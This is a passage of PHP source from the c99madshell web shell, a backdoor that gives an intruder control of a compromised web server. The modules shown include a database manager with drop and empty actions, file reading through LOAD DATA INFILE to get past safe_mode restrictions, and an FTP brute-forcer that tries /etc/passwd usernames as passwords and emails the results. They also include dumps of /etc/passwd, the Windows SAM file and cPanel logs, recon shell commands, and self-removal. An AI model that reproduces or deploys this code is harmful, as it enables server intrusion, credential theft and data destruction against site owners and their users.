      echo "<form method=\"POST\"><input type=\"hidden\" name=\"act\" value=\"sql\"><input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"><input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"><input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"><input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"><input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><input type=\"hidden\" name=\"sql_order\" value=\"".htmlspecialchars($sql_order)."\"><b>From:</b>&nbsp;<input type=\"text\" name=\"sql_tbl_ls\" value=\"".$sql_tbl_ls."\">&nbsp;<b>To:</b>&nbsp;<input type=\"text\" name=\"sql_tbl_le\" value=\"".$sql_tbl_le."\">&nbsp;<input type=\"submit\" value=\"View\"></form>";
      echo "<br><form method=\"POST\"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"1%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>";
      echo "<tr>";
      echo "<td><input type=\"checkbox\" name=\"boxrow_all\" value=\"1\"></td>";
      for ($i=0;$i<mysql_num_fields($result);$i++)
      {
       $v = mysql_field_name($result,$i);
       if ($e[0] == "a") {$s = "d"; $m = "asc";}
       else {$s = "a"; $m = "desc";}
       echo "<td>";
       if (empty($e[0])) {$e[0] = "a";}
       if ($e[1] != $v) {$sql_order="";$sql_order=$e[0]." ".$v;echo "<a href=\"#\" onclick=\"document.sql.act.value='sql';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.sql_db.value='".urlencode($sql_db)."';document.sql.sql_tbl.value='".urlencode($sql_tbl)."';document.sql.sql_order.value='".$sql_order."';document.sql.sql_tbl_ls.value='".$sql_tbl_ls."';document.sql.sql_tbl_le.value='".$sql_tbl_le."';document.sql.submit();\"><b>".$v."</b></a>";}
       else {echo "<b>".$v."</b> <a href=\"#\" onclick=\"document.sql.act.value='sql';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.sql_db.value='".urlencode($sql_db)."';document.sql.sql_tbl.value='".urlencode($sql_tbl)."';document.sql.sql_order.value='".$s."%20".$v."';document.sql.sql_tbl_ls.value='".$sql_tbl_ls."';document.sql.sql_tbl_le.value='".$sql_tbl_le."';document.sql.submit();\"><font color=red>\/</font></a>";}
       echo "</td>";
      }
      echo "<td><font color=\"green\"><b>Action</b></font></td>";
      echo "</tr>";
      while ($row = mysql_fetch_array($result, MYSQL_ASSOC))
      {
       echo "<tr>";
       $w = "";
       $i = 0;
       foreach ($row as $k=>$v) {$name = mysql_field_name($result,$i); $w .= " `".$name."` = '".addslashes($v)."' AND"; $i++;}
       if (count($row) > 0) {$w = substr($w,0,strlen($w)-3);}
       echo "<td><input type=\"checkbox\" name=\"boxrow[]\" value=\"".$w."\"></td>";
       $i = 0;
       foreach ($row as $k=>$v)
       {
        $v = htmlspecialchars($v);
        if ($v == "") {$v = "<font color=\"green\">NULL</font>";}
        echo "<td>".$v."</td>";
        $i++;
       }
       echo "<td>";
       echo "<a href=\"#\" onclick=\"document.sql.act.value='sql';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.sql_db.value='".urlencode($sql_db)."';document.sql.sql_act.value='query';document.sql.sql_query.value='".urlencode("DELETE FROM `".$sql_tbl."` WHERE".$w." LIMIT 1;")."';document.sql.sql_tbl.value='".urlencode($sql_tbl)."';document.sql.sql_tbl_ls.value='".$sql_tbl_ls."';document.sql.sql_tbl_le.value='".$sql_tbl_le."';document.sql.submit();\"><b>DEL</b></a>&nbsp;";
       echo "<a href=\"#\" onclick=\"document.sql.act.value='sql';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.sql_db.value='".urlencode($sql_db)."';document.sql.sql_tbl_act.value='insert';document.sql.sql_tbl_insert_q.value='".urlencode($w)."';document.sql.sql_tbl.value='".urlencode($sql_tbl)."';document.sql.sql_tbl_ls.value='".$sql_tbl_ls."';document.sql.sql_tbl_le.value='".$sql_tbl_le."';document.sql.submit();\"><b>EDIT</b></a>&nbsp;";
       echo "</td>";
       echo "</tr>";
      }
      mysql_free_result($result);
      echo "</table><hr size=\"1\" noshade><p align=\"left\"><select name=\"sql_act\">";
      echo "<option value=\"\">With selected:</option>";
      echo "<option value=\"deleterow\">Delete</option>";
      echo "</select>&nbsp;<input type=\"submit\" value=\"Confirm\"></form></p>";
     }
    }
    else
    {
     $result = mysql_query("SHOW TABLE STATUS", $sql_sock);
     if (!$result) {echo mysql_smarterror();}
     else
     {
      echo "<br><form method=\"POST\"><input name='act' type='hidden' value='sql'><input name='sql_login' type='hidden' value='".$sql_login."'><input name='sql_server' type='hidden' value='".$sql_server."'><input name='sql_port' type='hidden' value='".$sql_port."'><input name='sql_db' type='hidden' value='".$sql_db."'><input name='sql_passwd' type='hidden' value='".$sql_passwd."'><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td><input type=\"checkbox\" name=\"boxtbl_all\" value=\"1\"></td><td><center><b>Table</b></center></td><td><b>Rows</b></td><td><b>Type</b></td><td><b>Created</b></td><td><b>Modified</b></td><td><b>Size</b></td><td><b>Action</b></td></tr>";
      $i = 0;
      $tsize = $trows = 0;
      while ($row = mysql_fetch_array($result, MYSQL_ASSOC))
      {
       $tsize += $row["Data_length"];
       $trows += $row["Rows"];
       $size = view_size($row["Data_length"]);
       echo "<tr>";
       echo "<td><input type=\"checkbox\" name=\"boxtbl[]\" value=\"".$row["Name"]."\"></td>";

       echo "<td>&nbsp;<a href=\"#\" onclick=\"document.sql.act.value='sql';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.sql_db.value='".urlencode($sql_db)."';document.sql.sql_tbl.value='".urlencode($row["Name"])."';document.sql.submit();\"><b>".$row["Name"]."</b></a>&nbsp;</td>";
       echo "<td>".$row["Rows"]."</td>";
       echo "<td>".$row["Type"]."</td>";
       echo "<td>".$row["Create_time"]."</td>";
       echo "<td>".$row["Update_time"]."</td>";
       echo "<td>".$size."</td>";

       echo "<td>&nbsp;<a href=\"#\" onclick=\"document.sql.act.value='sql';document.sql.sql_act.value='query';document.sql.sql_query.value='".urlencode("DELETE FROM `".$row["Name"]."`")."';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.sql_db.value='".urlencode($sql_db)."';document.sql.submit();\"><b>EMPT</b></a>&nbsp;&nbsp;<a href=\"#\" onclick=\"document.sql.act.value='sql';document.sql.sql_act.value='query';document.sql.sql_query.value='".urlencode("DROP TABLE `".$row["Name"]."`")."';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.sql_db.value='".urlencode($sql_db)."';document.sql.submit();\"><b>DROP</b></a>&nbsp;<a href=\"#\" onclick=\"document.sql.act.value='sql';document.sql.sql_tbl.value='".$row["Name"]."';document.sql.sql_tbl_act.value='insert';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.sql_db.value='".urlencode($sql_db)."';document.sql.submit();\"><b>INS</b></a>&nbsp;</td>";
       echo "</tr>";
       $i++;
      }
      echo "<tr bgcolor=\"000000\">";
      echo "<td><center><b>�</b></center></td>";
      echo "<td><center><b>".$i." table(s)</b></center></td>";
      echo "<td><b>".$trows."</b></td>";
      echo "<td>".$row[1]."</td>";
      echo "<td>".$row[10]."</td>";
      echo "<td>".$row[11]."</td>";
      echo "<td><b>".view_size($tsize)."</b></td>";
      echo "<td></td>";
      echo "</tr>";
      echo "</table><hr size=\"1\" noshade><p align=\"right\"><select name=\"sql_act\">";
      echo "<option value=\"\">With selected:</option>";
      echo "<option value=\"tbldrop\">Drop</option>";
      echo "<option value=\"tblempty\">Empty</option>";
      echo "<option value=\"tbldump\">Dump</option>";
      echo "<option value=\"tblcheck\">Check table</option>";
      echo "<option value=\"tbloptimize\">Optimize table</option>";
      echo "<option value=\"tblrepair\">Repair table</option>";
      echo "<option value=\"tblanalyze\">Analyze table</option>";
      echo "</select>&nbsp;<input type=\"submit\" value=\"Confirm\"></form></p>";
      mysql_free_result($result);
     }
    }
   }
   }
  }
  else
  {
   $acts = array("","newdb","serverstatus","servervars","processes","getfile");
   if (in_array($sql_act,$acts)) {?><?php echo htmlspecialchars($sql_login); ?><?php echo htmlspecialchars($sql_passwd); ?><?php echo htmlspecialchars($sql_server); ?><?php echo htmlspecialchars($sql_port); ?><?php echo htmlspecialchars($sql_login); ?><?php echo htmlspecialchars($sql_passwd); ?><?php echo htmlspecialchars($sql_server); ?><?php echo htmlspecialchars($sql_port); ?><?php echo htmlspecialchars($sql_getfile); ?><?php }
   if (!empty($sql_act))
   {
    echo "<hr size=\"1\" noshade>";
    if ($sql_act == "newdb")
    {
     echo "<b>";
     if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!</b><br>";}
     else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".<br>Reason:</b> ".mysql_smarterror();}
    }
    if ($sql_act == "serverstatus")
    {
     $result = mysql_query("SHOW STATUS", $sql_sock);
     echo "<center><b>Server-status variables:</b><br><br>";
     echo "<TABLE cellSpacing=0 cellPadding=0 bgColor=#333333 borderColorLight=#333333 border=1><td><b>Name</b></td><td><b>Value</b></td></tr>";
     while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td></tr>";}
     echo "</table></center>";
     mysql_free_result($result);
    }
    if ($sql_act == "servervars")
    {
     $result = mysql_query("SHOW VARIABLES", $sql_sock);
     echo "<center><b>Server variables:</b><br><br>";
     echo "<TABLE cellSpacing=0 cellPadding=0 bgColor=#333333 borderColorLight=#333333 border=1><td><b>Name</b></td><td><b>Value</b></td></tr>";
     while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td></tr>";}
     echo "</table>";
     mysql_free_result($result);
    }
    if ($sql_act == "processes")
    {
     if (!empty($kill)) {$query = "KILL ".$kill.";"; $result = mysql_query($query, $sql_sock); echo "<b>Killing process #".$kill."... ok. he is dead, amen.</b>";}
     $result = mysql_query("SHOW PROCESSLIST", $sql_sock);
     echo "<center><b>Processes:</b><br><br>";
     echo "<TABLE cellSpacing=0 cellPadding=2 bgColor=#333333 borderColorLight=#333333 border=1><td><b>ID</b></td><td><b>USER</b></td><td><b>HOST</b></td><td><b>DB</b></td><td><b>COMMAND</b></td><td><b>TIME</b></td><td><b>STATE</b></td><td><b>INFO</b></td><td><b>Action</b></td></tr>";
     while ($row = mysql_fetch_array($result, MYSQL_NUM)) { echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td><td>".$row[2]."</td><td>".$row[3]."</td><td>".$row[4]."</td><td>".$row[5]."</td><td>".$row[6]."</td><td>".$row[7]."</td><td><a href=\"#\" onclick=\"document.sql.act.value='sql';document.sql.sql_login.value='".htmlspecialchars($sql_login)."';document.sql.sql_passwd.value='".htmlspecialchars($sql_passwd)."';document.sql.sql_server.value='".htmlspecialchars($sql_server)."';document.sql.sql_port.value='".htmlspecialchars($sql_port)."';document.sql.sql_act.value='processes';document.sql.kill.value='".$row[0]."';document.sql.submit();\"><u>Kill</u></a></td></tr>";}
     echo "</table>";
     mysql_free_result($result);
    }
    if ($sql_act == "getfile")
    {
     $tmpdb = $sql_login."_tmpdb";
     $select = mysql_select_db($tmpdb);
     if (!$select) {mysql_create_db($tmpdb); $select = mysql_select_db($tmpdb); $created = !!$select;}
     if ($select)
     {
      $created = FALSE;
      mysql_query("CREATE TABLE `tmp_file` ( `Viewing the file in safe_mode+open_basedir` LONGBLOB NOT NULL );");
      mysql_query("LOAD DATA INFILE \"".addslashes($sql_getfile)."\" INTO TABLE tmp_file");
      $result = mysql_query("SELECT * FROM tmp_file;");
      if (!$result) {echo "<b>Error in reading file (permision denied)!</b>";}
      else
      {
       for ($i=0;$i<mysql_num_fields($result);$i++) {$name = mysql_field_name($result,$i);}
       $f = "";
       while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {$f .= join ("\r\n",$row);}
       if (empty($f)) {echo "<b>File \"".$sql_getfile."\" does not exists or empty!</b><br>";}
       else {echo "<b>File \"".$sql_getfile."\":</b><br>".nl2br(htmlspecialchars($f))."<br>";}
       mysql_free_result($result);
       mysql_query("DROP TABLE tmp_file;");
      }
     }
     mysql_drop_db($tmpdb); //comment it if you want to leave database
    }
   }
  }
 }
 echo "</td></tr></table>";
 if ($sql_sock)
 {
  $affected = @mysql_affected_rows($sql_sock);
  if ((!is_numeric($affected)) or ($affected < 0)){$affected = 0;}
  echo "<tr><td><center><b>Affected rows: ".$affected."</center></td></tr>";
 }
 echo "</table>";
}
if ($act == "mkdir")
{
 if ($mkdir != $d)
 {
  if (file_exists($mkdir)) {echo "<b>Make Dir \"".htmlspecialchars($mkdir)."\"</b>: object alredy exists";}
  elseif (!mkdir($mkdir)) {echo "<b>Make Dir \"".htmlspecialchars($mkdir)."\"</b>: access denied";}
  echo "<br><br>";
 }
 $act = $dspact = "ls";
}
if ($act == "ftpquickbrute")
{
 echo "<b>Ftp Quick brute:</b><br>";
 if (!win) {echo "This functions not work in Windows!<br><br>";}
 else
 {
  function c99ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)
  {
   if ($fqb_onlywithsh) {$TRUE = (!in_array($sh,array("/bin/FALSE","/sbin/nologin")));}
   else {$TRUE = TRUE;}
   if ($TRUE)
   {
    $sock = @ftp_connect($host,$port,$timeout);
    if (@ftp_login($sock,$login,$pass))
    {
     echo "<a href=\"ftp://".$login.":".$pass."@".$host."\" target=\"_blank\"><b>Connected to ".$host." with login \"".$login."\" and password \"".$pass."\"</b></a>.<br>";
     ob_flush();
     return TRUE;
    }
   }
  }
  if (!empty($submit))
  {
   if (isset($_POST['fqb_lenght'])) $fqb_lenght = $_POST['fqb_lenght'];
   if (!is_numeric($fqb_lenght)) {$fqb_lenght = $nixpwdperpage;}
   $fp = fopen("/etc/passwd","r");
   if (!$fp) {echo "Can't get /etc/passwd for password-list.";}
   else
   {
    if (isset($_POST['fqb_logging'])) $fqb_logging = $_POST['fqb_logging'];
    if ($fqb_logging)
    {
     if (isset($_POST['fqb_logfile'])) $fqb_logging = $_POST['fqb_logfile'];
     if ($fqb_logfile) {$fqb_logfp = fopen($fqb_logfile,"w");}
     else {$fqb_logfp = FALSE;}
     $fqb_log = "FTP Quick Brute (called c99madshell v. ".$shver.") started at ".date("d.m.Y H:i:s")."\r\n\r\n";
     if ($fqb_logfile) {fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}
    }
    ob_flush();
    $i = $success = 0;
    $ftpquick_st = getmicrotime();
    while(!feof($fp))
    {
     $str = explode(":",fgets($fp,2048));
     if (c99ftpbrutecheck("localhost",21,1,$str[0],$str[0],$str[6],$fqb_onlywithsh))
     {
      echo "<b>Connected to ".getenv("SERVER_NAME")." with login \"".$str[0]."\" and password \"".$str[0]."\"</b><br>";
      $fqb_log .= "Connected to ".getenv("SERVER_NAME")." with login \"".$str[0]."\" and password \"".$str[0]."\", at ".date("d.m.Y H:i:s")."\r\n";
      if ($fqb_logfp) {fseek($fqb_logfp,0); fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}
      $success++;
      ob_flush();
     }
     if ($i > $fqb_lenght) {break;}
     $i++;
    }
    if ($success == 0) {echo "No success. connections!"; $fqb_log .= "No success. connections!\r\n";}
    $ftpquick_t = round(getmicrotime()-$ftpquick_st,4);
    echo "<hr size=\"1\" noshade><b>Done!</b><br>Total time (secs.): ".$ftpquick_t."<br>Total connections: ".$i."<br>Success.: <font color=green><b>".$success."</b></font><br>Unsuccess.:".($i-$success)."</b><br>Connects per second: ".round($i/$ftpquick_t,2)."<br>";
    $fqb_log .= "\r\n------------------------------------------\r\nDone!\r\nTotal time (secs.): ".$ftpquick_t."\r\nTotal connections: ".$i."\r\nSuccess.: ".$success."\r\nUnsuccess.:".($i-$success)."\r\nConnects per second: ".round($i/$ftpquick_t,2)."\r\n";
    if ($fqb_logfp) {fseek($fqb_logfp,0); fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}
    if ($fqb_logemail) {@mail($fqb_logemail,"c99shell v. ".$shver." report",$fqb_log);}
    fclose($fqb_logfp);
   }
  }
  else
  {
   $logfile = $tmpdir_logs."c99sh_ftpquickbrute_".date("d.m.Y_H_i_s").".log";
   $logfile = str_replace("//",DIRECTORY_SEPARATOR,$logfile);
   echo "<form method=\"POST\"><input type=hidden name=act value=\"ftpquickbrute\"><br>Read first: <input type=text name=\"fqb_lenght\" value=\"".$nixpwdperpage."\"><br><br>Users only with shell?&nbsp;<input type=\"checkbox\" name=\"fqb_onlywithsh\" value=\"1\"><br><br>Logging?&nbsp;<input type=\"checkbox\" name=\"fqb_logging\" value=\"1\" checked><br>Logging to file?&nbsp;<input type=\"text\" name=\"fqb_logfile\" value=\"".$logfile."\" size=\"".(strlen($logfile)+2*(strlen($logfile)/10))."\"><br>Logging to e-mail?&nbsp;<input type=\"text\" name=\"fqb_logemail\" value=\"".$log_email."\" size=\"".(strlen($logemail)+2*(strlen($logemail)/10))."\"><br><br><input type=submit name=submit value=\"Brute\"></form>";
  }
 }
}
if ($act == "d")
{
 if (!is_dir($d)) {echo "<center><b>Permision denied!</b></center>";}
 else
 {
  echo "<b>Directory information:</b><table border=0 cellspacing=1 cellpadding=2>";
  if (!$win)
  {
   echo "<tr><td><b>Owner/Group</b></td><td> ";
   //$ow = posix_getpwuid(fileowner($d));
   //$gr = posix_getgrgid(filegroup($d));
   $row[] = ($ow["name"]?$ow["name"]:fileowner($d))."/".($gr["name"]?$gr["name"]:filegroup($d));
  }
  echo "<tr><td><b>Perms</b></td><td><a href=\"#\" onclick=\"document.todo.act.value='chmod';document.todo.d.value='".urlencode($d)."';document.todo.submit();\"><b>".view_perms_color($d)."</b></a><tr><td><b>Create time</b></td><td> ".date("d/m/Y H:i:s",filectime($d))."</td></tr><tr><td><b>Access time</b></td><td> ".date("d/m/Y H:i:s",fileatime($d))."</td></tr><tr><td><b>MODIFY time</b></td><td> ".date("d/m/Y H:i:s",filemtime($d))."</td></tr></table><br>";
 }
}
if ($act == "phpinfo") {@ob_clean(); phpinfo(); c99shexit();}
if ($act == "security")
{
 echo "<center><b>Server security information:</b></center><b>Open base dir: ".$hopenbasedir."</b><br>";
 if (!$win)
 {
  if ($nixpasswd)
  {
   if ($nixpasswd == 1) {$nixpasswd = 0;}
   echo "<b>*nix /etc/passwd:</b><br>";
   if (!is_numeric($nixpwd_s)) {$nixpwd_s = 0;}
   if (!is_numeric($nixpwd_e)) {$nixpwd_e = $nixpwdperpage;}
   echo "<form method=\"POST\"><input type=hidden name=act value=\"security\"><input type=hidden name=\"nixpasswd\" value=\"1\"><b>From:</b>&nbsp;<input type=\"text=\" name=\"nixpwd_s\" value=\"".$nixpwd_s."\">&nbsp;<b>To:</b>&nbsp;<input type=\"text\" name=\"nixpwd_e\" value=\"".$nixpwd_e."\">&nbsp;<input type=submit value=\"View\"></form><br>";
   $i = $nixpwd_s;
   while ($i < $nixpwd_e)
   {
    $uid = posix_getpwuid($i);
    if ($uid)
    {
     $uid["dir"] = "<a href=\"#\" onclick=\"document.todo.act.value='ls';document.todo.d.value='".urlencode($uid["dir"])."';document.todo.submit();\">".$uid["dir"]."</a>";
     echo join(":",$uid)."<br>";
    }
    $i++;
   }
  }
  else {echo "<br><a href=\"#\" onclick=\"document.todo.act.value='security';document.todo.d.value='".$ud."';document.todo.nixpasswd.value='1';document.todo.submit();\"><b><u>Get /etc/passwd</u></b></a><br>";}
 }
 else
 {
  $v = $_SERVER["WINDIR"]."\repair\sam";
  if (file_get_contents($v)) {echo "<b><font color=red>You can't crack winnt passwords(".$v.") </font></b><br>";}
  else {echo "<b><font color=green>You can crack winnt passwords. <a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='sam';document.todo.d.value='".$_SERVER["WINDIR"]."\/repair';document.todo.ft.value='download';document.todo.submit();\"><u><b>Download</b></u></a>, and use lcp.crack+ �.</font></b><br>";}
 }
 if (file_get_contents("/etc/userdomains")) {echo "<b><font color=green><a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='userdomains';document.todo.d.value='".urlencode("/etc")."';document.todo.ft.value='txt';document.todo.submit();\"><u><b>View cpanel user-domains logs</b></u></a></font></b><br>";}
 if (file_get_contents("/var/cpanel/accounting.log")) {echo "<b><font color=green><a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='accounting.log';document.todo.d.value='".urlencode("/var/cpanel/")."';document.todo.ft.value='txt';document.todo.submit();\"><u><b>View cpanel logs</b></u></a></font></b><br>";}
 if (file_get_contents("/usr/local/apache/conf/httpd.conf")) {echo "<b><font color=green><a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='httpd.conf';document.todo.d.value='".urlencode("/usr/local/apache/conf")."';document.todo.ft.value='txt';document.todo.submit();\"><u><b>Apache configuration (httpd.conf)</b></u></a></font></b><br>";}
 if (file_get_contents("/etc/httpd.conf")) {echo "<b><font color=green><a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='httpd.conf';document.todo.d.value='".urlencode("/etc")."';document.todo.ft.value='txt';document.todo.submit();\"><u><b>Apache configuration (httpd.conf)</b></u></a></font></b><br>";}
 if (file_get_contents("/etc/syslog.conf")) {echo "<b><font color=green><a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='syslog.conf';document.todo.d.value='".urlencode("/etc")."';document.todo.ft.value='txt';document.todo.submit();\"><u><b>Syslog configuration (syslog.conf)</b></u></a></font></b><br>";}
 if (file_get_contents("/etc/motd")) {echo "<b><font color=green><a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='motd';document.todo.d.value='".urlencode("/etc")."';document.todo.ft.value='txt';document.todo.submit();\"><u><b>Message Of The Day</b></u></a></font></b><br>";}
 if (file_get_contents("/etc/hosts")) {echo "<b><font color=green><a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='hosts';document.todo.d.value='".urlencode("/etc")."';document.todo.ft.value='txt';document.todo.submit();\"><u><b>Hosts</b></u></a></font></b><br>";}
 function displaysecinfo($name,$value) {if (!empty($value)) {if (!empty($name)) {$name = "<b>".$name." - </b>";} echo $name.nl2br($value)."<br>";}}
 displaysecinfo("OS Version?",myshellexec("cat /proc/version"));
 displaysecinfo("Kernel version?",myshellexec("sysctl -a | grep version"));
 displaysecinfo("Distrib name",myshellexec("cat /etc/issue.net"));
 displaysecinfo("Distrib name (2)",myshellexec("cat /etc/*-realise"));
 displaysecinfo("CPU?",myshellexec("cat /proc/cpuinfo"));
 displaysecinfo("RAM",myshellexec("free -m"));
 displaysecinfo("HDD space",myshellexec("df -h"));
 displaysecinfo("List of Attributes",myshellexec("lsattr -a"));
 displaysecinfo("Mount options ",myshellexec("cat /etc/fstab"));
 displaysecinfo("Is cURL installed?",myshellexec("which curl"));
 displaysecinfo("Is lynx installed?",myshellexec("which lynx"));
 displaysecinfo("Is links installed?",myshellexec("which links"));
 displaysecinfo("Is fetch installed?",myshellexec("which fetch"));
 displaysecinfo("Is GET installed?",myshellexec("which GET"));
 displaysecinfo("Is perl installed?",myshellexec("which perl"));
 displaysecinfo("Where is apache",myshellexec("whereis apache"));
 displaysecinfo("Where is perl?",myshellexec("whereis perl"));
 displaysecinfo("locate proftpd.conf",myshellexec("locate proftpd.conf"));
 displaysecinfo("locate httpd.conf",myshellexec("locate httpd.conf"));
 displaysecinfo("locate my.conf",myshellexec("locate my.conf"));
 displaysecinfo("locate psybnc.conf",myshellexec("locate psybnc.conf"));
}
if ($act == "mkfile")
{
 if ($mkfile != $d)
 {
  if (file_exists($mkfile)) {echo "<b>Make File \"".htmlspecialchars($mkfile)."\"</b>: object alredy exists";}
  elseif (!fopen($mkfile,"w")) {echo "<b>Make File \"".htmlspecialchars($mkfile)."\"</b>: access denied";}
  else {$act = "f"; $d = dirname($mkfile); if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;} $f = basename($mkfile);}
 }
 else {$act = $dspact = "ls";}
}
if ($act == "fsbuff")
{
 $arr_copy = $sess_data["copy"];
 $arr_cut = $sess_data["cut"];
 $arr = array_merge($arr_copy,$arr_cut);
 if (count($arr) == 0) {echo "<center><b>Buffer is empty!</b></center>";}
 else {echo "<b>File-System buffer</b><br><br>"; $ls_arr = $arr; $disp_fullpath = TRUE; $act = "ls";}
}
if ($act == "selfremove")
{
 if (($submit == $rndcode) and ($submit != ""))
 {
  if (unlink(__FILE__)) {@ob_clean(); echo "Thanks for using c99madshell v.".$shver."!"; c99shexit(); }
  else {echo "<center><b>Can't delete ".__FILE__."!</b></center>";}
 }
 else
 {
  if (!empty($rndcode)) {echo "<b>Error: incorrect confimation!</b>";}
  $rnd = rand(0,9).rand(0,9).rand(0,9);
  echo "<form method=\"POST\"><input type=hidden name=act value=selfremove><b>Self-remove: ".__FILE__." <br><b>Are you sure?<br>For confirmation, enter \"".$rnd."\"</b>:&nbsp;<input type=hidden name=rndcode value=\"".$rnd."\"><input type=text name=submit>&nbsp;<input type=submit value=\"YES\"></form>";
 }
}
if ($act == "search")
{
 echo "<b>Search in file-system:</b><br>";
 if (empty($search_in)) {$search_in = $d;}
 if (empty($search_name)) {$search_name = "(.*)"; $search_name_regexp = 1;}
 if (empty($search_text_wwo)) {$search_text_regexp = 0;}
 if (!empty($submit))
 {
  $found = array();
  $found_d = 0;
  $found_f = 0;
  $search_i_f = 0;
  $search_i_d = 0;
  $a = array
  (
   "name"=>$search_name, "name_regexp"=>$search_name_regexp,
   "text"=>$search_text, "text_regexp"=>$search_text_regxp,
   "text_wwo"=>$search_text_wwo,
   "text_cs"=>$search_text_cs,
   "text_not"=>$search_text_not
  );
  $searchtime = getmicrotime();
  $in = array_unique(explode(";",$search_in));
  foreach($in as $v) {c99fsearch($v);}
  $searchtime = round(getmicrotime()-$searchtime,4);
  if (count($found) == 0) {echo "<b>No files found!</b>";}
  else
  {
   $ls_arr = $found;
   $disp_fullpath = TRUE;
   $act = "ls";
  }
 }
 echo "<form method=POST>
<input type=hidden name=\"d\" value=\"".$dispd."\"><input type=hidden name=act value=\"".$dspact."\">
<b>Search for (file/folder name): </b><input type=\"text\" name=\"search_name\" size=\"".round(strlen($search_name)+25)."\" value=\"".htmlspecialchars($search_name)."\">&nbsp;<input type=\"checkbox\" name=\"search_name_regexp\" value=\"1\" ".($search_name_regexp == 1?" checked":"")."> - regexp
<br><b>Search in (explode \";\"): </b><input type=\"text\" name=\"search_in\" size=\"".round(strlen($search_in)+25)."\" value=\"".htmlspecialchars($search_in)."\">
<br><br><b>Text:</b><br><textarea name=\"search_text\" cols=\"122\" rows=\"10\">".htmlspecialchars($search_text)."</textarea>
<br><br><input type=\"checkbox\" name=\"search_text_regexp\" value=\"1\" ".($search_text_regexp == 1?" checked":"")."> - regexp
&nbsp;&nbsp;<input type=\"checkbox\" name=\"search_text_wwo\" value=\"1\" ".($search_text_wwo == 1?" checked":"")."> - <u>w</u>hole words only
&nbsp;&nbsp;<input type=\"checkbox\" name=\"search_text_cs\" value=\"1\" ".($search_text_cs == 1?" checked":"")."> - cas<u>e</u> sensitive
&nbsp;&nbsp;<input type=\"checkbox\" name=\"search_text_not\" value=\"1\" ".($search_text_not == 1?" checked":"")."> - find files <u>NOT</u> containing the text
<br><br><input type=submit name=submit value=\"Search\"></form>";
 if ($act == "ls") {$dspact = $act; echo "<hr size=\"1\" noshade><b>Search took ".$searchtime." secs (".$search_i_f." files and ".$search_i_d." folders, ".round(($search_i_f+$search_i_d)/$searchtime,4)." objects per second).</b><br><br>";}
}
if ($act == "chmod")
{
 $mode = fileperms($d.$f);
 if (!$mode) {echo "<b>Change file-mode with error:</b> can't get current value.";}
 else
 {
  $form = TRUE;
  if ($chmod_submit)
  {
